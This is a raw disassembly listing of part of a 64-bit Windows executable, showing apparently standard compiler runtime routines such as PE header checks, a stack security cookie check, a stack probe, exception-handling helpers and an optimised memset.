   14000d8ca:	48 8b d9             	mov    %rcx,%rbx
   14000d8cd:	e8 9e fb ff ff       	call   0x14000d470
   14000d8d2:	83 e3 3f             	and    $0x3f,%ebx
   14000d8d5:	0b c3                	or     %ebx,%eax
   14000d8d7:	8b c8                	mov    %eax,%ecx
   14000d8d9:	48 83 c4 20          	add    $0x20,%rsp
   14000d8dd:	5b                   	pop    %rbx
   14000d8de:	e9 9d fb ff ff       	jmp    0x14000d480
   14000d8e3:	cc                   	int3
   14000d8e4:	48 83 ec 28          	sub    $0x28,%rsp
   14000d8e8:	e8 83 fb ff ff       	call   0x14000d470
   14000d8ed:	83 e0 3f             	and    $0x3f,%eax
   14000d8f0:	48 83 c4 28          	add    $0x28,%rsp
   14000d8f4:	c3                   	ret
   14000d8f5:	cc                   	int3
   14000d8f6:	cc                   	int3
   14000d8f7:	cc                   	int3
   14000d8f8:	cc                   	int3
   14000d8f9:	cc                   	int3
   14000d8fa:	cc                   	int3
   14000d8fb:	cc                   	int3
   14000d8fc:	cc                   	int3
   14000d8fd:	cc                   	int3
   14000d8fe:	cc                   	int3
   14000d8ff:	cc                   	int3
   14000d900:	4c 63 41 3c          	movslq 0x3c(%rcx),%r8
   14000d904:	45 33 c9             	xor    %r9d,%r9d
   14000d907:	4c 03 c1             	add    %rcx,%r8
   14000d90a:	4c 8b d2             	mov    %rdx,%r10
   14000d90d:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   14000d912:	45 0f b7 58 06       	movzwl 0x6(%r8),%r11d
   14000d917:	48 83 c0 18          	add    $0x18,%rax
   14000d91b:	49 03 c0             	add    %r8,%rax
   14000d91e:	45 85 db             	test   %r11d,%r11d
   14000d921:	74 1e                	je     0x14000d941
   14000d923:	8b 50 0c             	mov    0xc(%rax),%edx
   14000d926:	4c 3b d2             	cmp    %rdx,%r10
   14000d929:	72 0a                	jb     0x14000d935
   14000d92b:	8b 48 08             	mov    0x8(%rax),%ecx
   14000d92e:	03 ca                	add    %edx,%ecx
   14000d930:	4c 3b d1             	cmp    %rcx,%r10
   14000d933:	72 0e                	jb     0x14000d943
   14000d935:	41 ff c1             	inc    %r9d
   14000d938:	48 83 c0 28          	add    $0x28,%rax
   14000d93c:	45 3b cb             	cmp    %r11d,%r9d
   14000d93f:	72 e2                	jb     0x14000d923
   14000d941:	33 c0                	xor    %eax,%eax
   14000d943:	c3                   	ret
   14000d944:	cc                   	int3
   14000d945:	cc                   	int3
   14000d946:	cc                   	int3
   14000d947:	cc                   	int3
   14000d948:	cc                   	int3
   14000d949:	cc                   	int3
   14000d94a:	cc                   	int3
   14000d94b:	cc                   	int3
   14000d94c:	cc                   	int3
   14000d94d:	cc                   	int3
   14000d94e:	cc                   	int3
   14000d94f:	cc                   	int3
   14000d950:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000d955:	57                   	push   %rdi
   14000d956:	48 83 ec 20          	sub    $0x20,%rsp
   14000d95a:	48 8b d9             	mov    %rcx,%rbx
   14000d95d:	48 8d 3d 9c 26 ff ff 	lea    -0xd964(%rip),%rdi        # 0x140000000
   14000d964:	48 8b cf             	mov    %rdi,%rcx
   14000d967:	e8 34 00 00 00       	call   0x14000d9a0
   14000d96c:	85 c0                	test   %eax,%eax
   14000d96e:	74 22                	je     0x14000d992
   14000d970:	48 2b df             	sub    %rdi,%rbx
   14000d973:	48 8b d3             	mov    %rbx,%rdx
   14000d976:	48 8b cf             	mov    %rdi,%rcx
   14000d979:	e8 82 ff ff ff       	call   0x14000d900
   14000d97e:	48 85 c0             	test   %rax,%rax
   14000d981:	74 0f                	je     0x14000d992
   14000d983:	8b 40 24             	mov    0x24(%rax),%eax
   14000d986:	c1 e8 1f             	shr    $0x1f,%eax
   14000d989:	f7 d0                	not    %eax
   14000d98b:	83 e0 01             	and    $0x1,%eax
   14000d98e:	eb 02                	jmp    0x14000d992
   14000d990:	33 c0                	xor    %eax,%eax
   14000d992:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000d997:	48 83 c4 20          	add    $0x20,%rsp
   14000d99b:	5f                   	pop    %rdi
   14000d99c:	c3                   	ret
   14000d99d:	cc                   	int3
   14000d99e:	cc                   	int3
   14000d99f:	cc                   	int3
   14000d9a0:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   14000d9a5:	66 39 01             	cmp    %ax,(%rcx)
   14000d9a8:	75 1e                	jne    0x14000d9c8
   14000d9aa:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   14000d9ae:	48 03 d1             	add    %rcx,%rdx
   14000d9b1:	81 3a 50 45 00 00    	cmpl   $0x4550,(%rdx)
   14000d9b7:	75 0f                	jne    0x14000d9c8
   14000d9b9:	33 c0                	xor    %eax,%eax
   14000d9bb:	b9 0b 02 00 00       	mov    $0x20b,%ecx
   14000d9c0:	66 39 4a 18          	cmp    %cx,0x18(%rdx)
   14000d9c4:	0f 94 c0             	sete   %al
   14000d9c7:	c3                   	ret
   14000d9c8:	33 c0                	xor    %eax,%eax
   14000d9ca:	c3                   	ret
   14000d9cb:	cc                   	int3
   14000d9cc:	40 53                	rex push %rbx
   14000d9ce:	48 83 ec 20          	sub    $0x20,%rsp
   14000d9d2:	48 8d 05 df 8d 00 00 	lea    0x8ddf(%rip),%rax        # 0x1400167b8
   14000d9d9:	48 8b d9             	mov    %rcx,%rbx
   14000d9dc:	48 89 01             	mov    %rax,(%rcx)
   14000d9df:	f6 c2 01             	test   $0x1,%dl
   14000d9e2:	74 0a                	je     0x14000d9ee
   14000d9e4:	ba 18 00 00 00       	mov    $0x18,%edx
   14000d9e9:	e8 c2 00 00 00       	call   0x14000dab0
   14000d9ee:	48 8b c3             	mov    %rbx,%rax
   14000d9f1:	48 83 c4 20          	add    $0x20,%rsp
   14000d9f5:	5b                   	pop    %rbx
   14000d9f6:	c3                   	ret
   14000d9f7:	cc                   	int3
   14000d9f8:	48 83 ec 28          	sub    $0x28,%rsp
   14000d9fc:	4d 8b 41 38          	mov    0x38(%r9),%r8
   14000da00:	48 8b ca             	mov    %rdx,%rcx
   14000da03:	49 8b d1             	mov    %r9,%rdx
   14000da06:	e8 0d 00 00 00       	call   0x14000da18
   14000da0b:	b8 01 00 00 00       	mov    $0x1,%eax
   14000da10:	48 83 c4 28          	add    $0x28,%rsp
   14000da14:	c3                   	ret
   14000da15:	cc                   	int3
   14000da16:	cc                   	int3
   14000da17:	cc                   	int3
   14000da18:	40 53                	rex push %rbx
   14000da1a:	45 8b 18             	mov    (%r8),%r11d
   14000da1d:	48 8b da             	mov    %rdx,%rbx
   14000da20:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   14000da24:	4c 8b c9             	mov    %rcx,%r9
   14000da27:	41 f6 00 04          	testb  $0x4,(%r8)
   14000da2b:	4c 8b d1             	mov    %rcx,%r10
   14000da2e:	74 13                	je     0x14000da43
   14000da30:	41 8b 40 08          	mov    0x8(%r8),%eax
   14000da34:	4d 63 50 04          	movslq 0x4(%r8),%r10
   14000da38:	f7 d8                	neg    %eax
   14000da3a:	4c 03 d1             	add    %rcx,%r10
   14000da3d:	48 63 c8             	movslq %eax,%rcx
   14000da40:	4c 23 d1             	and    %rcx,%r10
   14000da43:	49 63 c3             	movslq %r11d,%rax
   14000da46:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   14000da4a:	48 8b 43 10          	mov    0x10(%rbx),%rax
   14000da4e:	8b 48 08             	mov    0x8(%rax),%ecx
   14000da51:	48 8b 43 08          	mov    0x8(%rbx),%rax
   14000da55:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   14000da5a:	74 0b                	je     0x14000da67
   14000da5c:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   14000da61:	83 e0 f0             	and    $0xfffffff0,%eax
   14000da64:	4c 03 c8             	add    %rax,%r9
   14000da67:	4c 33 ca             	xor    %rdx,%r9
   14000da6a:	49 8b c9             	mov    %r9,%rcx
   14000da6d:	5b                   	pop    %rbx
   14000da6e:	e9 1d 00 00 00       	jmp    0x14000da90
   14000da73:	cc                   	int3
   14000da74:	cc                   	int3
   14000da75:	cc                   	int3
   14000da76:	cc                   	int3
   14000da77:	cc                   	int3
   14000da78:	cc                   	int3
   14000da79:	cc                   	int3
   14000da7a:	cc                   	int3
   14000da7b:	cc                   	int3
   14000da7c:	cc                   	int3
   14000da7d:	cc                   	int3
   14000da7e:	cc                   	int3
   14000da7f:	cc                   	int3
   14000da80:	cc                   	int3
   14000da81:	cc                   	int3
   14000da82:	cc                   	int3
   14000da83:	cc                   	int3
   14000da84:	cc                   	int3
   14000da85:	cc                   	int3
   14000da86:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000da8d:	00 00 00 
   14000da90:	48 3b 0d a9 b5 00 00 	cmp    0xb5a9(%rip),%rcx        # 0x140019040
   14000da97:	75 10                	jne    0x14000daa9
   14000da99:	48 c1 c1 10          	rol    $0x10,%rcx
   14000da9d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   14000daa2:	75 01                	jne    0x14000daa5
   14000daa4:	c3                   	ret
   14000daa5:	48 c1 c9 10          	ror    $0x10,%rcx
   14000daa9:	e9 3e 00 00 00       	jmp    0x14000daec
   14000daae:	cc                   	int3
   14000daaf:	cc                   	int3
   14000dab0:	e9 6b 02 00 00       	jmp    0x14000dd20
   14000dab5:	cc                   	int3
   14000dab6:	cc                   	int3
   14000dab7:	cc                   	int3
   14000dab8:	40 53                	rex push %rbx
   14000daba:	48 83 ec 20          	sub    $0x20,%rsp
   14000dabe:	48 8b d9             	mov    %rcx,%rbx
   14000dac1:	33 c9                	xor    %ecx,%ecx
   14000dac3:	ff 15 97 15 00 00    	call   *0x1597(%rip)        # 0x14000f060
   14000dac9:	48 8b cb             	mov    %rbx,%rcx
   14000dacc:	ff 15 86 15 00 00    	call   *0x1586(%rip)        # 0x14000f058
   14000dad2:	ff 15 50 16 00 00    	call   *0x1650(%rip)        # 0x14000f128
   14000dad8:	48 8b c8             	mov    %rax,%rcx
   14000dadb:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   14000dae0:	48 83 c4 20          	add    $0x20,%rsp
   14000dae4:	5b                   	pop    %rbx
   14000dae5:	48 ff 25 4c 16 00 00 	rex.W jmp *0x164c(%rip)        # 0x14000f138
   14000daec:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000daf1:	48 83 ec 38          	sub    $0x38,%rsp
   14000daf5:	b9 17 00 00 00       	mov    $0x17,%ecx
   14000dafa:	ff 15 70 15 00 00    	call   *0x1570(%rip)        # 0x14000f070
   14000db00:	85 c0                	test   %eax,%eax
   14000db02:	74 07                	je     0x14000db0b
   14000db04:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000db09:	cd 29                	int    $0x29
   14000db0b:	48 8d 0d 7e cd 00 00 	lea    0xcd7e(%rip),%rcx        # 0x14001a890
   14000db12:	e8 a9 00 00 00       	call   0x14000dbc0
   14000db17:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   14000db1c:	48 89 05 65 ce 00 00 	mov    %rax,0xce65(%rip)        # 0x14001a988
   14000db23:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   14000db28:	48 83 c0 08          	add    $0x8,%rax
   14000db2c:	48 89 05 f5 cd 00 00 	mov    %rax,0xcdf5(%rip)        # 0x14001a928
   14000db33:	48 8b 05 4e ce 00 00 	mov    0xce4e(%rip),%rax        # 0x14001a988
   14000db3a:	48 89 05 bf cc 00 00 	mov    %rax,0xccbf(%rip)        # 0x14001a800
   14000db41:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000db46:	48 89 05 c3 cd 00 00 	mov    %rax,0xcdc3(%rip)        # 0x14001a910
   14000db4d:	c7 05 99 cc 00 00 09 	movl   $0xc0000409,0xcc99(%rip)        # 0x14001a7f0
   14000db54:	04 00 c0 
   14000db57:	c7 05 93 cc 00 00 01 	movl   $0x1,0xcc93(%rip)        # 0x14001a7f4
   14000db5e:	00 00 00 
   14000db61:	c7 05 9d cc 00 00 01 	movl   $0x1,0xcc9d(%rip)        # 0x14001a808
   14000db68:	00 00 00 
   14000db6b:	b8 08 00 00 00       	mov    $0x8,%eax
   14000db70:	48 6b c0 00          	imul   $0x0,%rax,%rax
   14000db74:	48 8d 0d 95 cc 00 00 	lea    0xcc95(%rip),%rcx        # 0x14001a810
   14000db7b:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   14000db82:	00 
   14000db83:	b8 08 00 00 00       	mov    $0x8,%eax
   14000db88:	48 6b c0 00          	imul   $0x0,%rax,%rax
   14000db8c:	48 8b 0d ad b4 00 00 	mov    0xb4ad(%rip),%rcx        # 0x140019040
   14000db93:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   14000db98:	b8 08 00 00 00       	mov    $0x8,%eax
   14000db9d:	48 6b c0 01          	imul   $0x1,%rax,%rax
   14000dba1:	48 8b 0d d8 b4 00 00 	mov    0xb4d8(%rip),%rcx        # 0x140019080
   14000dba8:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   14000dbad:	48 8d 0d 0c 8c 00 00 	lea    0x8c0c(%rip),%rcx        # 0x1400167c0
   14000dbb4:	e8 ff fe ff ff       	call   0x14000dab8
   14000dbb9:	48 83 c4 38          	add    $0x38,%rsp
   14000dbbd:	c3                   	ret
   14000dbbe:	cc                   	int3
   14000dbbf:	cc                   	int3
   14000dbc0:	40 53                	rex push %rbx
   14000dbc2:	56                   	push   %rsi
   14000dbc3:	57                   	push   %rdi
   14000dbc4:	48 83 ec 40          	sub    $0x40,%rsp
   14000dbc8:	48 8b d9             	mov    %rcx,%rbx
   14000dbcb:	ff 15 67 14 00 00    	call   *0x1467(%rip)        # 0x14000f038
   14000dbd1:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   14000dbd8:	33 ff                	xor    %edi,%edi
   14000dbda:	45 33 c0             	xor    %r8d,%r8d
   14000dbdd:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   14000dbe2:	48 8b ce             	mov    %rsi,%rcx
   14000dbe5:	ff 15 55 14 00 00    	call   *0x1455(%rip)        # 0x14000f040
   14000dbeb:	48 85 c0             	test   %rax,%rax
   14000dbee:	74 39                	je     0x14000dc29
   14000dbf0:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000dbf6:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   14000dbfb:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   14000dc00:	4c 8b c8             	mov    %rax,%r9
   14000dc03:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   14000dc08:	4c 8b c6             	mov    %rsi,%r8
   14000dc0b:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000dc10:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000dc15:	33 c9                	xor    %ecx,%ecx
   14000dc17:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000dc1c:	ff 15 26 14 00 00    	call   *0x1426(%rip)        # 0x14000f048
   14000dc22:	ff c7                	inc    %edi
   14000dc24:	83 ff 02             	cmp    $0x2,%edi
   14000dc27:	7c b1                	jl     0x14000dbda
   14000dc29:	48 83 c4 40          	add    $0x40,%rsp
   14000dc2d:	5f                   	pop    %rdi
   14000dc2e:	5e                   	pop    %rsi
   14000dc2f:	5b                   	pop    %rbx
   14000dc30:	c3                   	ret
   14000dc31:	cc                   	int3
   14000dc32:	cc                   	int3
   14000dc33:	cc                   	int3
   14000dc34:	cc                   	int3
   14000dc35:	cc                   	int3
   14000dc36:	cc                   	int3
   14000dc37:	cc                   	int3
   14000dc38:	cc                   	int3
   14000dc39:	cc                   	int3
   14000dc3a:	cc                   	int3
   14000dc3b:	cc                   	int3
   14000dc3c:	cc                   	int3
   14000dc3d:	cc                   	int3
   14000dc3e:	cc                   	int3
   14000dc3f:	cc                   	int3
   14000dc40:	cc                   	int3
   14000dc41:	cc                   	int3
   14000dc42:	cc                   	int3
   14000dc43:	cc                   	int3
   14000dc44:	cc                   	int3
   14000dc45:	cc                   	int3
   14000dc46:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000dc4d:	00 00 00 
   14000dc50:	48 83 ec 10          	sub    $0x10,%rsp
   14000dc54:	4c 89 14 24          	mov    %r10,(%rsp)
   14000dc58:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   14000dc5d:	4d 33 db             	xor    %r11,%r11
   14000dc60:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   14000dc65:	4c 2b d0             	sub    %rax,%r10
   14000dc68:	4d 0f 42 d3          	cmovb  %r11,%r10
   14000dc6c:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   14000dc73:	00 00 
   14000dc75:	4d 3b d3             	cmp    %r11,%r10
   14000dc78:	73 16                	jae    0x14000dc90
   14000dc7a:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   14000dc80:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   14000dc87:	41 c6 03 00          	movb   $0x0,(%r11)
   14000dc8b:	4d 3b d3             	cmp    %r11,%r10
   14000dc8e:	75 f0                	jne    0x14000dc80
   14000dc90:	4c 8b 14 24          	mov    (%rsp),%r10
   14000dc94:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   14000dc99:	48 83 c4 10          	add    $0x10,%rsp
   14000dc9d:	c3                   	ret
   14000dc9e:	cc                   	int3
   14000dc9f:	cc                   	int3
   14000dca0:	48 8b c4             	mov    %rsp,%rax
   14000dca3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000dca7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000dcab:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000dcaf:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000dcb3:	41 56                	push   %r14
   14000dcb5:	48 83 ec 20          	sub    $0x20,%rsp
   14000dcb9:	49 8b 59 38          	mov    0x38(%r9),%rbx
   14000dcbd:	48 8b f2             	mov    %rdx,%rsi
   14000dcc0:	4d 8b f0             	mov    %r8,%r14
   14000dcc3:	48 8b e9             	mov    %rcx,%rbp
   14000dcc6:	49 8b d1             	mov    %r9,%rdx
   14000dcc9:	48 8b ce             	mov    %rsi,%rcx
   14000dccc:	49 8b f9             	mov    %r9,%rdi
   14000dccf:	4c 8d 43 04          	lea    0x4(%rbx),%r8
   14000dcd3:	e8 40 fd ff ff       	call   0x14000da18
   14000dcd8:	8b 45 04             	mov    0x4(%rbp),%eax
   14000dcdb:	24 66                	and    $0x66,%al
   14000dcdd:	f6 d8                	neg    %al
   14000dcdf:	b8 01 00 00 00       	mov    $0x1,%eax
   14000dce4:	45 1b c0             	sbb    %r8d,%r8d
   14000dce7:	41 f7 d8             	neg    %r8d
   14000dcea:	44 03 c0             	add    %eax,%r8d
   14000dced:	44 85 43 04          	test   %r8d,0x4(%rbx)
   14000dcf1:	74 11                	je     0x14000dd04
   14000dcf3:	4c 8b cf             	mov    %rdi,%r9
   14000dcf6:	4d 8b c6             	mov    %r14,%r8
   14000dcf9:	48 8b d6             	mov    %rsi,%rdx
   14000dcfc:	48 8b cd             	mov    %rbp,%rcx
   14000dcff:	e8 e8 4b ff ff       	call   0x1400028ec
   14000dd04:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000dd09:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000dd0e:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000dd13:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000dd18:	48 83 c4 20          	add    $0x20,%rsp
   14000dd1c:	41 5e                	pop    %r14
   14000dd1e:	c3                   	ret
   14000dd1f:	cc                   	int3
   14000dd20:	e9 e7 87 ff ff       	jmp    0x14000650c
   14000dd25:	cc                   	int3
   14000dd26:	cc                   	int3
   14000dd27:	cc                   	int3
   14000dd28:	cc                   	int3
   14000dd29:	cc                   	int3
   14000dd2a:	cc                   	int3
   14000dd2b:	cc                   	int3
   14000dd2c:	cc                   	int3
   14000dd2d:	cc                   	int3
   14000dd2e:	cc                   	int3
   14000dd2f:	cc                   	int3
   14000dd30:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000dd35:	57                   	push   %rdi
   14000dd36:	48 83 ec 20          	sub    $0x20,%rsp
   14000dd3a:	49 8b f8             	mov    %r8,%rdi
   14000dd3d:	48 8b d9             	mov    %rcx,%rbx
   14000dd40:	e8 1b 3d ff ff       	call   0x140001a60
   14000dd45:	f6 43 04 66          	testb  $0x66,0x4(%rbx)
   14000dd49:	75 0d                	jne    0x14000dd58
   14000dd4b:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   14000dd51:	75 05                	jne    0x14000dd58
   14000dd53:	83 f8 01             	cmp    $0x1,%eax
   14000dd56:	74 0b                	je     0x14000dd63
   14000dd58:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000dd5d:	48 83 c4 20          	add    $0x20,%rsp
   14000dd61:	5f                   	pop    %rdi
   14000dd62:	c3                   	ret
   14000dd63:	e8 a4 41 ff ff       	call   0x140001f0c
   14000dd68:	48 89 58 20          	mov    %rbx,0x20(%rax)
   14000dd6c:	e8 9b 41 ff ff       	call   0x140001f0c
   14000dd71:	48 89 78 28          	mov    %rdi,0x28(%rax)
   14000dd75:	e8 66 87 ff ff       	call   0x1400064e0
   14000dd7a:	cc                   	int3
   14000dd7b:	cc                   	int3
   14000dd7c:	cc                   	int3
   14000dd7d:	cc                   	int3
   14000dd7e:	cc                   	int3
   14000dd7f:	cc                   	int3
   14000dd80:	cc                   	int3
   14000dd81:	cc                   	int3
   14000dd82:	cc                   	int3
   14000dd83:	cc                   	int3
   14000dd84:	cc                   	int3
   14000dd85:	cc                   	int3
   14000dd86:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000dd8d:	00 00 00 
   14000dd90:	ff e0                	jmp    *%rax
   14000dd92:	cc                   	int3
   14000dd93:	cc                   	int3
   14000dd94:	cc                   	int3
   14000dd95:	cc                   	int3
   14000dd96:	cc                   	int3
   14000dd97:	cc                   	int3
   14000dd98:	cc                   	int3
   14000dd99:	cc                   	int3
   14000dd9a:	cc                   	int3
   14000dd9b:	cc                   	int3
   14000dd9c:	cc                   	int3
   14000dd9d:	cc                   	int3
   14000dd9e:	cc                   	int3
   14000dd9f:	cc                   	int3
   14000dda0:	cc                   	int3
   14000dda1:	cc                   	int3
   14000dda2:	cc                   	int3
   14000dda3:	cc                   	int3
   14000dda4:	cc                   	int3
   14000dda5:	cc                   	int3
   14000dda6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000ddad:	00 00 00 
   14000ddb0:	ff 25 aa 14 00 00    	jmp    *0x14aa(%rip)        # 0x14000f260
   14000ddb6:	cc                   	int3
   14000ddb7:	cc                   	int3
   14000ddb8:	cc                   	int3
   14000ddb9:	cc                   	int3
   14000ddba:	cc                   	int3
   14000ddbb:	cc                   	int3
   14000ddbc:	cc                   	int3
   14000ddbd:	cc                   	int3
   14000ddbe:	cc                   	int3
   14000ddbf:	cc                   	int3
   14000ddc0:	cc                   	int3
   14000ddc1:	cc                   	int3
   14000ddc2:	cc                   	int3
   14000ddc3:	cc                   	int3
   14000ddc4:	cc                   	int3
   14000ddc5:	cc                   	int3
   14000ddc6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000ddcd:	00 00 00 
   14000ddd0:	cc                   	int3
   14000ddd1:	cc                   	int3
   14000ddd2:	cc                   	int3
   14000ddd3:	cc                   	int3
   14000ddd4:	cc                   	int3
   14000ddd5:	cc                   	int3
   14000ddd6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000dddd:	00 00 00 
   14000dde0:	57                   	push   %rdi
   14000dde1:	8b c2                	mov    %edx,%eax
   14000dde3:	48 8b f9             	mov    %rcx,%rdi
   14000dde6:	49 8b c8             	mov    %r8,%rcx
   14000dde9:	f3 aa                	rep stos %al,(%rdi)
   14000ddeb:	49 8b c1             	mov    %r9,%rax
   14000ddee:	5f                   	pop    %rdi
   14000ddef:	c3                   	ret
   14000ddf0:	48 8b c1             	mov    %rcx,%rax
   14000ddf3:	4c 8b c9             	mov    %rcx,%r9
   14000ddf6:	4c 8d 15 03 22 ff ff 	lea    -0xddfd(%rip),%r10        # 0x140000000
   14000ddfd:	0f b6 d2             	movzbl %dl,%edx
   14000de00:	49 bb 01 01 01 01 01 	movabs $0x101010101010101,%r11
   14000de07:	01 01 01 
   14000de0a:	4c 0f af da          	imul   %rdx,%r11
   14000de0e:	66 49 0f 6e c3       	movq   %r11,%xmm0
   14000de13:	49 83 f8 0f          	cmp    $0xf,%r8
   14000de17:	0f 87 83 00 00 00    	ja     0x14000dea0
   14000de1d:	0f 1f 00             	nopl   (%rax)
   14000de20:	49 03 c8             	add    %r8,%rcx
   14000de23:	47 8b 8c 82 70 69 01 	mov    0x16970(%r10,%r8,4),%r9d
   14000de2a:	00 
   14000de2b:	4d 03 ca             	add    %r10,%r9
   14000de2e:	41 ff e1             	jmp    *%r9
   14000de31:	4c 89 59 f1          	mov    %r11,-0xf(%rcx)
   14000de35:	44 89 59 f9          	mov    %r11d,-0x7(%rcx)
   14000de39:	66 44 89 59 fd       	mov    %r11w,-0x3(%rcx)
   14000de3e:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   14000de42:	c3                   	ret
   14000de43:	4c 89 59 f2          	mov    %r11,-0xe(%rcx)
   14000de47:	44 89 59 fa          	mov    %r11d,-0x6(%rcx)
   14000de4b:	66 44 89 59 fe       	mov    %r11w,-0x2(%rcx)
   14000de50:	c3                   	ret
   14000de51:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000de58:	0f 1f 84 00 00 00 00 
   14000de5f:	00 
   14000de60:	4c 89 59 f3          	mov    %r11,-0xd(%rcx)
   14000de64:	44 89 59 fb          	mov    %r11d,-0x5(%rcx)
   14000de68:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   14000de6c:	c3                   	ret
   14000de6d:	0f 1f 00             	nopl   (%rax)
   14000de70:	4c 89 59 f4          	mov    %r11,-0xc(%rcx)
   14000de74:	44 89 59 fc          	mov    %r11d,-0x4(%rcx)
   14000de78:	c3                   	ret
   14000de79:	4c 89 59 f5          	mov    %r11,-0xb(%rcx)
   14000de7d:	66 44 89 59 fd       	mov    %r11w,-0x3(%rcx)
   14000de82:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   14000de86:	c3                   	ret
   14000de87:	4c 89 59 f7          	mov    %r11,-0x9(%rcx)
   14000de8b:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   14000de8f:	c3                   	ret
   14000de90:	4c 89 59 f6          	mov    %r11,-0xa(%rcx)
   14000de94:	66 44 89 59 fe       	mov    %r11w,-0x2(%rcx)
   14000de99:	c3                   	ret
   14000de9a:	4c 89 59 f8          	mov    %r11,-0x8(%rcx)
   14000de9e:	c3                   	ret
   14000de9f:	90                   	nop
   14000dea0:	66 0f 6c c0          	punpcklqdq %xmm0,%xmm0
   14000dea4:	49 83 f8 20          	cmp    $0x20,%r8
   14000dea8:	77 0c                	ja     0x14000deb6
   14000deaa:	f3 0f 7f 01          	movdqu %xmm0,(%rcx)
   14000deae:	f3 42 0f 7f 44 01 f0 	movdqu %xmm0,-0x10(%rcx,%r8,1)
   14000deb5:	c3                   	ret
   14000deb6:	83 3d 5b b1 00 00 03 	cmpl   $0x3,0xb15b(%rip)        # 0x140019018
   14000debd:	0f 82 dd 01 00 00    	jb     0x14000e0a0
   14000dec3:	4c 3b 05 56 b1 00 00 	cmp    0xb156(%rip),%r8        # 0x140019020
   14000deca:	76 16                	jbe    0x14000dee2
   14000decc:	4c 3b 05 55 b1 00 00 	cmp    0xb155(%rip),%r8        # 0x140019028
   14000ded3:	77 0d                	ja     0x14000dee2
   14000ded5:	f6 05 68 bc 00 00 02 	testb  $0x2,0xbc68(%rip)        # 0x140019b44
   14000dedc:	0f 85 fe fe ff ff    	jne    0x14000dde0
   14000dee2:	c4 e3 7d 18 c0 01    	vinsertf128 $0x1,%xmm0,%ymm0,%ymm0
   14000dee8:	4c 8b c9             	mov    %rcx,%r9
   14000deeb:	49 83 e1 1f          	and    $0x1f,%r9
   14000deef:	49 83 e9 20          	sub    $0x20,%r9
   14000def3:	49 2b c9             	sub    %r9,%rcx
   14000def6:	49 2b d1             	sub    %r9,%rdx
   14000def9:	4d 03 c1             	add    %r9,%r8
   14000defc:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000df03:	76 65                	jbe    0x14000df6a
   14000df05:	4c 3b 05 1c b1 00 00 	cmp    0xb11c(%rip),%r8        # 0x140019028
   14000df0c:	0f 87 ce 00 00 00    	ja     0x14000dfe0
   14000df12:	66 66 66 66 66 66 0f 	data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000df19:	1f 84 00 00 00 00 00 
   14000df20:	c5 fd 7f 01          	vmovdqa %ymm0,(%rcx)
   14000df24:	c5 fd 7f 41 20       	vmovdqa %ymm0,0x20(%rcx)
   14000df29:	c5 fd 7f 41 40       	vmovdqa %ymm0,0x40(%rcx)
   14000df2e:	c5 fd 7f 41 60       	vmovdqa %ymm0,0x60(%rcx)
   14000df33:	c5 fd 7f 81 80 00 00 	vmovdqa %ymm0,0x80(%rcx)
   14000df3a:	00 
